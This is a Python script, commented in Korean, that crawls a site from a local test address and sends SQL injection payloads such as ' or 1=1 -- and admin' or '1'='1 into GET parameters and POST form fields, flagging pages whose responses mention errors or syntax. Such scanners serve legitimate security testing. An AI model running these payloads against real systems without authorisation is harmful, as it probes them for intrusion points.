import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import init, Fore

# Colorama 초기화
init(autoreset=True)

# 방문한 URL을 저장하는 세트
visited_urls = set()

# SQL 인젝션 페이로드 목록
payloads = [
    "2-1",
    "2 and 1=1",
    "2 and 1=2",
    "' or 1=1 -- ",
    "' or 1=1 #",
    "admin' or '1'='1",
]


# SQL 인젝션 취약점 테스트 함수
def test_sql_injection(url, params, method="get"):
    for payload in payloads:
        if method == "get":
            # GET 요청에 파라미터 추가
            injected_params = {key: payload for key in params.keys()}
            response = requests.get(url, params=injected_params)
        elif method == "post":
            # POST 요청에 파라미터 추가
            injected_params = {key: payload for key in params.keys()}
            response = requests.post(url, data=injected_params)

        # 응답 결과 분석
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            return True  # 취약점 발견
    return False  # 취약점 없음


# HTML에서 링크를 추출하고 GET/POST 파라미터를 파악하는 함수
def get_links_and_params(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        links = set()
        is_vulnerable = False

        # 페이지에서 GET 파라미터 분석
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        if query_params:
            if test_sql_injection(url, query_params, method="get"):
                is_vulnerable = True

        # POST 파라미터 추출 (form 태그 분석)
        forms = soup.find_all("form")
        for form in forms:
            form_method = form.get("method", "get").lower()
            action = form.get("action")
            if action:
                action_url = urljoin(url, action)
            else:
                action_url = url

            inputs = form.find_all("input")
            post_params = {
                input_tag.get("name"): input_tag.get("value")
                for input_tag in inputs
                if input_tag.get("name")
            }

            if post_params and form_method == "post":
                if test_sql_injection(action_url, post_params, method="post"):
                    is_vulnerable = True

        # 모든 링크 추출
        for a_tag in soup.find_all("a", href=True):
            link = urljoin(url, a_tag["href"])
            parsed_link = urlparse(link)

            # 앵커(#) 링크 무시, 중복 URL 무시, 같은 도메인의 링크만 탐색
            if (
                parsed_link.fragment == ""
                and link not in visited_urls
                and link.startswith(url)
            ):
                links.add(link)

        return links, is_vulnerable
    except Exception as e:
        print(Fore.RED + f"Error accessing {url}: {e}")
        return set(), False


# 재귀적으로 URL 구조 탐색
def crawl(url, depth=0):
    if url in visited_urls:  # 이미 방문한 URL은 탐색하지 않음
        return

    visited_urls.add(url)

    # URL 출력 (계층적 구조로 표시)
    """
    ex)
    ├── http://127.0.0.1/index.php
    [-] No vulnerabilities detected
    ├── http://127.0.0.1/index.php?page=view&idx=2
        [!] Vulnerability detected
    ├── http://127.0.0.1/index.php?page=auth&idx=1&mode=view
        [!] Vulnerability detected
    ├── http://127.0.0.1/index.php?sort_column=writer&sort=desc
        [-] No vulnerabilities detected
    ├── http://127.0.0.1/index.php?sort_column=title&sort=desc
        [-] No vulnerabilities detected
    """
    print(f"{'    ' * depth}├── {Fore.WHITE}{url}")

    # URL의 모든 링크 가져오기 및 GET/POST 파라미터 파악
    links, is_vulnerable = get_links_and_params(url)

    # 취약점 여부를 같은 계층에서 출력
    if is_vulnerable:
        print(f"{'    ' * depth}{Fore.RED}    [!] SQL Injection Vulnerability detected")
    else:
        print(f"{'    ' * depth}{Fore.GREEN}    [-] No vulnerabilities detected")

    # 하위 링크들에 대해 재귀적으로 크롤링
    for link in links:
        crawl(link, depth + 1)


# 시작 URL 지정
start_url = "http://127.0.0.1/index.php"  # 대상 URL을 여기에 입력
crawl(start_url)
